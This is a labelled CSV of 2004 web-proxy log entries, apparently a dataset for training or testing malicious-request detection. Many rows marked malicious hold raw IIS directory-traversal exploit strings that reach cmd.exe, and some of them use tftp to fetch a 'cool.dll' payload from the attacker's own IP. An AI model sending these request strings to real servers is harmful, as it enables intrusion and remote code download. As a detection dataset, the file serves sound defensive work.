,ipaddress,dateandtime,url,statuscode,bytessent,refferer,useragent,class,malicious,url_sem_query,qtd_query_params,navegador
1289,161.142.39.204,10/Mar/2004:01:52:13 -0500,ede.nl.eu.undernet.org:6668 ,400,298,"""-""",-,n,0,ede.nl.eu.undernet.org:6668,0,without browser
1290,161.142.39.204,10/Mar/2004:01:52:25 -0500,fairfax.va.us.undernet.org:6660 ,400,302,"""-""",-,n,0,fairfax.va.us.undernet.org:6660,0,without browser
1291,161.142.39.204,10/Mar/2004:01:52:30 -0500,mesa.az.us.undernet.org:6660 ,400,299,"""-""",-,n,0,mesa.az.us.undernet.org:6660,0,without browser
1292,61.53.76.40,10/Mar/2004:01:52:33 -0500,http://69.59.175.60/found-best.com/search.php ,500,556,"""http://www.annies-biz.com/pages/ptc.php""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0),n,0,/found-best.com/search.php,0,Microsoft Internet Explorer
1293,161.142.39.204,10/Mar/2004:01:52:34 -0500,atlanta.ga.us.undernet.org:6664 ,400,302,"""-""",-,n,0,atlanta.ga.us.undernet.org:6664,0,without browser
1294,213.156.192.99,10/Mar/2004:01:52:36 -0500,http://www2.dokidoki.ne.jp/tomocrus/cgi-bin/check/prxjdg.cgi ,200,1018,"""-""",Mozilla/4.0 (compatible; ICS),n,0,/tomocrus/cgi-bin/check/prxjdg.cgi,0,without browser
1295,68.48.142.117,10/Mar/2004:01:52:37 -0500,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
1296,161.142.39.204,10/Mar/2004:01:52:38 -0500,elsene.be.eu.undernet.org:6668 ,400,301,"""-""",-,n,0,elsene.be.eu.undernet.org:6668,0,without browser
1297,203.121.182.140,10/Mar/2004:01:52:53 -0500,200.165.218.156:25 ,500,438,"""-""",-,n,0,200.165.218.156:25,0,without browser
1298,66.111.48.120,10/Mar/2004:01:53:18 -0500,http://www.madofsex.com/poster.html ,200,2561,"""-""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt),n,0,/poster.html,0,Microsoft Internet Explorer
1299,66.111.48.120,10/Mar/2004:01:53:18 -0500,http://www.madofsex.com/cgi-bin/cgi2.cgi ,200,2555,"""http://www.madofsex.com/cgi-bin/cgi2.cgi""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt),n,0,/cgi-bin/cgi2.cgi,0,Microsoft Internet Explorer
1300,66.111.48.120,10/Mar/2004:01:53:20 -0500,http://www.madofsex.com/cgi-bin/cgi2.cgi ,200,2555,"""http://www.madofsex.com/cgi-bin/cgi2.cgi""",Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt),n,0,/cgi-bin/cgi2.cgi,0,Microsoft Internet Explorer
1301,68.48.142.117,10/Mar/2004:01:53:27 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1302,221.7.192.11,10/Mar/2004:01:53:35 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.5 [en] (Win98; I),n,0,/index.asp,0,without browser
1303,192.117.242.67,10/Mar/2004:01:53:52 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1304,192.117.242.67,10/Mar/2004:01:53:56 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1305,161.142.39.204,10/Mar/2004:01:54:04 -0500,us.undernet.org:6667 ,200,0,"""-""",-,n,0,us.undernet.org:6667,0,without browser
1306,212.160.136.163,10/Mar/2004:01:54:05 -0500,http://www.searchyourpockets.com/xml/?&aff_id=1546&str=reference ,200,566,"""http://www.bodybuilding.powerlifter.ifbbpro.net/""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/xml/,2,Microsoft Internet Explorer
1307,68.48.142.117,10/Mar/2004:01:54:18 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1308,68.48.142.117,10/Mar/2004:01:55:08 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1309,221.7.192.11,10/Mar/2004:01:55:33 -0500,http://www.ccbbs.cn/ ,200,12711,"""http://www.ccbbs.cn""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/,0,Microsoft Internet Explorer
1310,68.48.142.117,10/Mar/2004:01:55:58 -0500,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe,0,without browser
1311,12.221.212.151,10/Mar/2004:01:56:04 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.7 ( compatible; [dk]; Windows NT5.0; win9x/NT 4.90 ),n,0,/members/index.html,0,without browser
1312,12.221.212.151,10/Mar/2004:01:56:04 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.7 ( compatible; MSIE 5.5; Windows 95; DigiExt ),n,0,/members/index.html,0,Microsoft Internet Explorer
1313,203.121.182.144,10/Mar/2004:01:56:11 -0500,221.147.5.145:25 ,200,0,"""-""",-,n,0,221.147.5.145:25,0,without browser
1314,192.117.242.67,10/Mar/2004:01:56:34 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1315,68.48.142.117,10/Mar/2004:01:56:48 -0500,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll ,200,566,"""-""",-,m,1,/_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll,0,without browser
1316,68.48.142.117,10/Mar/2004:01:56:48 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
1317,68.48.142.117,10/Mar/2004:01:56:48 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
1318,68.48.142.117,10/Mar/2004:01:56:48 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
1319,68.48.142.117,10/Mar/2004:01:56:48 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe,0,without browser
1320,68.48.142.117,10/Mar/2004:01:56:48 -0500,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll,0,without browser
1321,68.48.142.117,10/Mar/2004:01:56:48 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
1322,68.48.142.117,10/Mar/2004:01:56:48 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
1323,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
1324,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../winnt/system32/cmd.exe,0,without browser
1325,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c1%1c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%1c../httpodbc.dll,0,without browser
1326,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir ,400,305,"""-""",-,m,1,/scripts/..%c0%2f../winnt/system32/cmd.exe,0,without browser
1327,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1328,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1329,68.48.142.117,10/Mar/2004:01:56:49 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1330,68.48.142.117,10/Mar/2004:01:56:51 -0500,/scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../winnt/system32/cmd.exe,0,without browser
1331,68.48.142.117,10/Mar/2004:01:56:51 -0500,/scripts/..%c0%af../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c0%af../httpodbc.dll,0,without browser
1332,68.48.142.117,10/Mar/2004:01:56:51 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1333,68.48.142.117,10/Mar/2004:01:56:51 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1334,68.48.142.117,10/Mar/2004:01:56:52 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1335,68.48.142.117,10/Mar/2004:01:56:52 -0500,/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../winnt/system32/cmd.exe,0,without browser
1336,68.48.142.117,10/Mar/2004:01:56:52 -0500,/scripts/..%c1%9c../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%c1%9c../httpodbc.dll,0,without browser
1337,68.48.142.117,10/Mar/2004:01:56:52 -0500,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35%63../winnt/system32/cmd.exe,0,without browser
1338,68.48.142.117,10/Mar/2004:01:56:52 -0500,/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir ,400,289,"""-""",-,m,1,/scripts/..%%35c../winnt/system32/cmd.exe,0,without browser
1339,213.54.156.103,10/Mar/2004:01:57:02 -0500,http://dieb.webmaster-eye.de/?site=dieb&user=downloadking ,200,2417,"""-""",Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),n,0,/,2,Microsoft Internet Explorer
1340,220.173.17.142,10/Mar/2004:01:57:03 -0500,http://www.clickcheaper.com/search.php ,200,14813,"""http://www.163.net""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/search.php,0,Microsoft Internet Explorer
1341,68.48.142.117,10/Mar/2004:01:57:42 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1342,212.160.136.163,10/Mar/2004:01:58:04 -0500,http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble ,200,66551,"""http://www.gemini.dogs.homerescue.org/""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/cgi-bin/smartsearch/smartsearch.cgi,2,Microsoft Internet Explorer
1343,212.160.136.163,10/Mar/2004:01:58:09 -0500,http://www.searcheaven.net/cgi-bin/smartsearch/sf.cgi?t=xm&keys=sfadazsnaispacsksozpzcsxahaxadshaaavacadapzpahsphvscspaahfafsihhhmsmszsvhnaasosshnaohozchzsiamspayaaaaadanapzksdamsssyaisosihnaohozchzayassiaksosaadamzvhpazzdsihkadshapzhzoahavsxsksxsmsfavzvsmzhzzhfaihnadsmsaavafsoafzvhmsxaoaxsnshaaapsyashzzcavansysdssafshsoaxzazzazsyszsnaksiafsaadzzhosfadaxasakaaavshsczvzvsxsnszadakskafadsmhyzkazasaxsdaaspsfshaszvhvazszszsiakaaafsoashzzcayasafsnshavanshahzvzasxskadsmsdaaavsasmhxzhspadsiasshspsxsksyhczcayscszasacsxapsyanzkzksnanapsdsnavsiskadhczzsaskaaayshsisxshanzkhmsasoadacaasiapacanhzzasasnadsxsaazsxsosozczcadasszasacavszsksczahvaysnsyskakaoafassohyhmsfanaaazamsiszafsyhchssaaoaaassasxshsosyzmhvsfadaasmavavavshsmzvzzsascszsxsaafapamsohchvsxsyapsmsnafaxassyzpzmsdaysiscaoafsasyadhozcakadapazscaasishafzazdsaszaaacaksiapsysyzkzcaianafsdaispavafafhczdsdsmaascsasyshafsyzvhvsfsoadsdavaaskacsnhzzpaisysiadsaspsaacanhazkszasszsdsdskaxshsnzazmsaaisiahsdspsxamsyhyzksdanssacavsishafsozvzhazsosisxsashsxsyaszvzkazsysksmshavavsksczphoazsmszazshsyafassyzvhoayansksmafavayassmhzzasdskadsdshsxshamsyhfhmsxsoszsmshsiaoasayhfzhazszaaahacakafsasyhzzhadsyaaazafaaahskaxhfzzsxsksiazacsvavspaszpzkspasanacakavshacafzpzhsdsnsiadsasiapsasohczksfsmapacadafsxsoanhzzcsaadaxsvsdskshamanzhzcamsosvsmssskshsosyhczaazaxadsvaosvshsksohzzhsdansaacakspavshszzphssaasszsiacafafadsyzmzhakadsssmsnaaszsoanhfhvazayszadacsxavahsohazkassysmsnacspapafsmhzzmaiaiaasdsdavavasadzmhmazasadsmadskanassczvzhazassiscsdsyapshsyhchmaksoskazafavafacszzahoaisyaasnaosyapsoaszzhvaksysyacsdskshsosozvzmaisyaasvsaaosxassmzmhoaismapazsaaaansoskzvzpsaadaxsxacskapssaszmhmszsysmazafafsksoadhzhvsaasadsdsaavsxacadzvzcszsmanassdafsfsoaszpzasxsyaxsxsdsisxavsmhzhoakadaaasscspacsksmhfzksxskaxacshacsasaadzchoszadssasavsiafafsmhczmayaysysdshsvavafadhchoazadaasnakspaxacayhfhfsxszsyasshspsaadsmzvhoaasmhyaozyaisasshszfhpsxavsszpspaoszzosizyzvssaxassssvshayzihaaozmahavaxhnsvapaizhspzchkspskssayayzffhdhhnaaanzfhshfhnsasvam&kw=scrabble ,300,1183,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),m,1,/cgi-bin/smartsearch/sf.cgi,3,Microsoft Internet Explorer
1344,218.72.85.59,10/Mar/2004:01:58:10 -0500,http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi ,200,2220,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),n,0,/trino/ProxyJ/prxjdg.cgi,0,Microsoft Internet Explorer
1345,212.160.136.163,10/Mar/2004:01:58:12 -0500,http://xmlrevenue.com/other.php?k=hphahchhhhzmhmhnhphazfzshdzdzihsznzpdhdsfvhozihnzohvhfhchshhzohihfzyhfhmfffohdhvzaaizfhmhiaazhfsdsdafdfzamzodvdifyapadsohzfoacayaddkhahyhffodyfdapafaddffzdydpaaaczzfdahsmhssodyfyfddsacfpaaszakfydpadasfyzfzsfsfoapfhdahszvdosifizksisnsdhsacakaozyzydcszsvsafkzmszhafpsdzffzdizydvsvddaddcaxfvaoskddfyhzfafsafzpfkhcsdfoafdiaidzzyhdsafmakszavzisdachyhvznaodfdnzfdosnscfmszhnfvfhasfhfhdkdkhsdcdvfhfxsoayszhadfschdshshzkzzshaydssaayfmdoafszafddfvfosdskdkfhfcaofpsispdfssaisishhhdiadaofihmavsdfcdadddcdpfhdxdydzhyscsaavdyafaffmfxsyskaidkzyamzyhzzpandpzdfpzkakdhddfkazdoskfyahszsvafzcdydadkdhfpfkdddcfxdfscfkffsoaxzizdskzcsshsananfafxdodifvfshafnfdfffvssffhmfcfydzzksksksmsvsyakshskzaddzfhhhazkzchozafadchvaxsyshzcazafaasaavsmsdaasihnshasskhcsdaisihnakszaahhzchpzosfazsdsysvadzcszsxafayaahzhphfayassdad&u=search123&a=searcheaven&keywords=scrabble&gen=xmlfeed&gto=zhzahihxhazfzohyzizc ,300,0,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),m,1,/other.php,6,Microsoft Internet Explorer
1346,212.160.136.163,10/Mar/2004:01:58:13 -0500,http://click.search123.com/cgi-bin/clickthru.cgi?EI=53503&Q=scrabble&NGT=SjHWIF0SZXNBGpl6q1e+9yyQWdABPUBYDVZJ3vuodKeHnHEFm9I+Bp+2+y3IvhaNBraJymt9CUXZBZEJOgr3LseM1ecghVxwAwMZXhoXZQaytSWlrTpz15qp7dA9dqyNNAW8XRQPgEH0dCtaL5QMu389eg0ddrWt78UgVvYr2L6mHM5VJlnNoZeHzA3GD9oY5f7SgerC+8nip+oau9CqU21JNzDU59AijZFidwXcGGFJk+wfT3wlBQRGjrsXWI395VbjpI5xjzFGY6mOTSYU0w==&x=1&IP=192.168.1.103&UID=48982 ,300,377,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/cgi-bin/clickthru.cgi,6,Microsoft Internet Explorer
1347,212.160.136.163,10/Mar/2004:01:58:18 -0500,http://www.looksmart.com/og/pr=Psr;ro=5;rc=6;la=182957;lm=134001;li=100985024;ed=20021108;ii=80bb.2f9a.404ebc6d.736e;pn=;to=;tc=6;po=5;pc=6;pi=pza3;ts=%7Chttp://www.bizrate.com/mkt.xpml?mkt_id=960409 ,300,225,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/og/pr=Psr;ro=5;rc=6;la=182957;lm=134001;li=100985024;ed=20021108;ii=80bb.2f9a.404ebc6d.736e;pn=;to=;tc=6;po=5;pc=6;pi=pza3;ts=%7Chttp://www.bizrate.com/mkt.xpml,1,Microsoft Internet Explorer
1348,212.160.136.163,10/Mar/2004:01:58:22 -0500,http://www.bizrate.com/mkt.xpml?mkt_id=960409 ,300,0,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/mkt.xpml,1,Microsoft Internet Explorer
1349,212.160.136.163,10/Mar/2004:01:58:25 -0500,http://www.bizrate.com/mkt_int.xpml?mkt_id=960409&url_id=83372&rf=ldi&lp=6 ,300,442,"""http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=scrabble""",Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),n,0,/mkt_int.xpml,4,Microsoft Internet Explorer
1350,68.48.142.117,10/Mar/2004:01:58:34 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1351,192.117.242.67,10/Mar/2004:01:58:44 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1352,221.7.192.11,10/Mar/2004:01:58:54 -0500,http://ccbbs.cn/ ,200,9080,"""http://ccbbs.cn""",Mozilla/4.0 (compatible; MSIE 5.5; Windows NT),n,0,/,0,Microsoft Internet Explorer
1353,68.48.142.117,10/Mar/2004:01:59:24 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1354,203.121.182.187,10/Mar/2004:01:59:36 -0500,195.33.205.196:25 ,200,0,"""-""",-,n,0,195.33.205.196:25,0,without browser
1355,66.98.138.149,10/Mar/2004:02:00:00 -0500,http://66.98.138.12/mature.php ,200,242,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Window NT 5.1),n,0,/mature.php,0,Microsoft Internet Explorer
1356,66.98.138.149,10/Mar/2004:02:00:00 -0500,66.98.138.12:80 ,200,0,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; AOL 8.0; Window NT 5.1),n,0,66.98.138.12:80,0,Microsoft Internet Explorer
1357,213.156.192.99,10/Mar/2004:02:00:12 -0500,http://www.glocksoft.net/cgi-bin/jenv.cgi ,200,1169,"""-""",Mozilla/4.0,n,0,/cgi-bin/jenv.cgi,0,without browser
1358,68.48.142.117,10/Mar/2004:02:00:15 -0500,/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../winnt/system32/cmd.exe,0,without browser
1359,12.221.212.151,10/Mar/2004:02:00:24 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/5.0 ( compatible; MSIE 5.01; Windows 95; NetCaptor ),n,0,/members/index.html,0,Microsoft Internet Explorer
1360,12.221.212.151,10/Mar/2004:02:00:25 -0500,http://www.sapphicerotica.com/members/index.html ,200,0,"""http://www.sapphicerotica.com/members/index.html""",Mozilla/4.0 ( compatible; MSIE 5.5; Windows NT4.0; DigiExt ),n,0,/members/index.html,0,Microsoft Internet Explorer
1361,213.156.192.99,10/Mar/2004:02:00:26 -0500,login.yahoo.com:443 ,200,0,"""-""",Advanced Administrative Tools,n,0,login.yahoo.com:443,0,without browser
1362,221.7.192.11,10/Mar/2004:02:00:38 -0500,http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3 ,200,578,"""http://www.baidu.com/baidu?word=%CD%F8%D7%AC+%D3%B6%BD%F0%D6%D0%B9%FA&cl=3""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),m,1,/baidu,2,Microsoft Internet Explorer
1363,68.48.142.117,10/Mar/2004:02:01:05 -0500,/scripts/..%25%35%63../httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%25%35%63../httpodbc.dll,0,without browser
1364,221.7.192.11,10/Mar/2004:02:01:06 -0500,http://ccbbs.cn/index.asp ,200,12711,"""http://ccbbs.cn/index.asp""",Mozilla/4.0 (compatible; MSIE 5.5; Windows 98),n,0,/index.asp,0,Microsoft Internet Explorer
1365,61.237.215.17,10/Mar/2004:02:01:07 -0500,http://www.honey-search.com/cgi-bin/smartsearch/smartsearch.cgi ,300,310,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/cgi-bin/smartsearch/smartsearch.cgi,0,Microsoft Internet Explorer
1366,61.237.215.17,10/Mar/2004:02:01:08 -0500,http://www.honey-search.com/cgi-bin/smartsearch/search.cgi?keywords=People%20Search&username=gu0000 ,200,71,"""http://www.linkou.con.cn""",Mozilla/4.0 (compatible; MSIE 5.02; Windows 98),n,0,/cgi-bin/smartsearch/search.cgi,2,Microsoft Internet Explorer
1367,218.72.85.59,10/Mar/2004:02:01:21 -0500,http://hpcgi1.nifty.com/trino/ProxyJ/prxjdg.cgi ,200,2216,"""-""",Mozilla/4.0 (compatible; MSIE 6.0; Windows 98),n,0,/trino/ProxyJ/prxjdg.cgi,0,Microsoft Internet Explorer
1368,192.117.242.67,10/Mar/2004:02:01:27 -0500,login.icq.com:443 ,200,0,"""-""",-,n,0,login.icq.com:443,0,without browser
1369,68.48.142.117,10/Mar/2004:02:01:56 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+dir ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
1370,68.48.142.117,10/Mar/2004:02:02:46 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
1371,220.173.17.142,10/Mar/2004:02:03:33 -0500,http://www.clickcheaper.com/search.php ,200,17372,"""http://www.yahoo.com""",Mozilla/4.0 (compatible; MSIE 4.0; Windows NT),n,0,/search.php,0,Microsoft Internet Explorer
1372,68.48.142.117,10/Mar/2004:02:03:36 -0500,/scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll ,200,566,"""-""",-,m,1,/scripts/..%252f../winnt/system32/cmd.exe,0,without browser
